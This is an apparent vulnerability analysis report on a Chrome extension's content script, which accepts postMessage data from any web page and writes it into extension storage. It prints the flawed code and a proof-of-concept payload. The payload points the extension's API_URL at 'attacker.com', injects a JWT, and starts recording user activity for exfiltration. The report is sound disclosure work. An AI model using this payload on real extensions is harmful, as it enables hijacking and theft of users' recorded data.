# CoCo Analysis: chjoanbbbllaihmkkcokfkaojegehmaa

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 5

---

## Sink 1: cs_window_eventListener_message → chrome_storage_local_set_sink (API_URL)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/chjoanbbbllaihmkkcokfkaojegehmaa/opgen_generated_files/cs_0.js
Line 1856    window.addEventListener('message', function(event) {
Line 1858    if (event.data && event.data.from === 'curiosity-modeller' && event.data.action === 'start-scan') {
Line 1868    API_URL: event.data.api_url,
```

## Sink 2: cs_window_eventListener_message → chrome_storage_local_set_sink (workspace)

**CoCo Trace:**
```
Line 1869    workspace: event.data.workspace,
```

## Sink 3: cs_window_eventListener_message → chrome_storage_local_set_sink (project_id)

**CoCo Trace:**
```
Line 1870    project_id: event.data.project,
```

## Sink 4: cs_window_eventListener_message → chrome_storage_local_set_sink (release_id)

**CoCo Trace:**
```
Line 1871    release_id: event.data.release,
```

## Sink 5: cookies_source → window_postMessage_sink

**CoCo Trace:**
```
from cookies_source to window_postMessage_sink
```

**Code:**

```javascript
// Content script - Runs on ALL URLs (cs_0.js Line 1856)
window.addEventListener('message', function(event) {
  if (event.source !== window) return;

  if (event.data && event.data.from === 'curiosity-modeller' && event.data.action === 'check-extension') {
    window.postMessage({
      from: 'curiosity-extension'
    }, '*');
  } else if (event.data && event.data.from === 'curiosity-modeller' && event.data.action === 'start-scan') {
    // Line 1864: Set JWT
    chrome.runtime.sendMessage({ operation: 'set_id_token', data: event.data.jwt }); // ← attacker-controlled JWT

    // Line 1867-1873: Set project & release
    chrome.storage.local.set({ ext_mode: 'scanner', service_settings: {
      API_URL: event.data.api_url,      // ← attacker-controlled API URL
      workspace: event.data.workspace,   // ← attacker-controlled workspace
      project_id: event.data.project,    // ← attacker-controlled project_id
      release_id: event.data.release,    // ← attacker-controlled release_id
      ext_mode: 'scanner'
    }});

    // Line 1876: Open URL
    chrome.runtime.sendMessage({ operation: "open_url", data: event.data.url });

    // Line 1879: Start scanner
    chrome.runtime.sendMessage({operation: "record_scanner", start_url:  event.data.url}, function(response) {
      console.log(response);
    });
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage on all websites

**Attack:**

```javascript
// From any malicious webpage (content script runs on ALL URLs)
window.postMessage({
  from: 'curiosity-modeller',
  action: 'start-scan',
  jwt: 'attacker-controlled-jwt-token',
  api_url: 'https://attacker.com/api',
  workspace: 'attacker-workspace',
  project: 'attacker-project',
  release: 'attacker-release',
  url: 'https://victim-target.com'
}, '*');

// This allows attacker to:
// 1. Inject malicious API_URL to redirect all extension API calls to attacker's server
// 2. Control JWT token used for authentication
// 3. Pollute storage with attacker-controlled configuration
// 4. Trigger scanner to open arbitrary URLs and record user actions
// 5. Exfiltrate recorded data to attacker-controlled API endpoint
```

**Impact:** Complete compromise of extension functionality. Any malicious website can hijack the extension by injecting a malicious API_URL into storage. All subsequent API calls and recorded user actions (test recordings, screenshots, etc.) will be sent to the attacker's server instead of the legitimate Curiosity API. The attacker can also inject arbitrary JWT tokens and trigger the scanner to record user activity on any website, with all data exfiltrated to the attacker-controlled endpoint. This represents a complete storage exploitation chain: attacker data → storage.set → later retrieval → exfiltration to attacker's API.
